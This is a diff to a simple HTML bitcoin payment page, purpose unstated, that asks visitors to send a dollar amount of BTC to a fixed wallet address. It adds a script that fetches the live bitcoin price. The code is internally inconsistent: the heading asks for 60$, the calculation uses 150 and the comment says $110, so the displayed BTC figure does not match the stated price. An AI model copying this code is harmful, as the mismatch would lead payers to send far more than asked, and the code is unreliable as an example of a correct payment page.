@@ -22,9 +22,9 @@
 <h2 class="h1">Welcome, this is automated payment.
 </h2>
 
-<h4>1$ = 0.00003692 BTC</h4>
+<h4><span id="bitcoinPrice"></span></h4>
 
-<h3 class="h3">Please send 130$ of BTC to:</h3>
+<h3 class="h3">Please send 60$ of BTC to:</h3>
 
 <h3>bc1qwzdl989lh9sawdxtus3d5mg2qqsr88t248nvxms88pgw8c23xq7q70zdrf</h2>
     <img class="qr" src="qrcode.png">
@@ -35,5 +35,24 @@
 
         <br><br><br><br><img src="footer.png">
     </center>
+    <script>
+         // Bitcoin price update
+        function updateBitcoinPrice() {
+            // Make an API call to fetch the latest Bitcoin price
+            fetch("https://api.coindesk.com/v1/bpi/currentprice/USD.json")
+                .then(response => response.json())
+                .then(data => {
+                    var bitcoinPrice = data.bpi.USD.rate_float;
+                    var equivalentAmount = (150 / bitcoinPrice).toFixed(6); // Calculate the equivalent Bitcoin amount for $110
+                    document.getElementById("bitcoinPrice").textContent = equivalentAmount;
+                })
+                .catch(error => {
+                    console.log("Error fetching Bitcoin price:", error);
+                });
+        }
+
+        updateBitcoinPrice();
+        setInterval(updateBitcoinPrice, 60000); // Update Bitcoin price every minute
+    </script>
 </body>
 </html>
